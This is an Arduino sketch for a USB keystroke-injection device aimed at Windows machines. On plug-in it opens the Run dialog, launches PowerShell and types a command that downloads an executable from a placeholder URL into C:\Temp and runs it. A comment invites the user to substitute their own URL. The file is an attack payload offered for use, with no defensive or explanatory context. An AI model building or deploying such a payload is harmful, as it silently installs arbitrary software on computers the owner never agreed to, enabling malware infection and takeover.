#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1500);
  Keyboard.print("iwr -Uri \"https://example.com\" -OutFile \"C:\\Temp\\installer.exe\" ; Start-Process \"C:\\Temp\\installer.exe\""); // replace example.com with ur url
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.end();
}

void loop() {

}
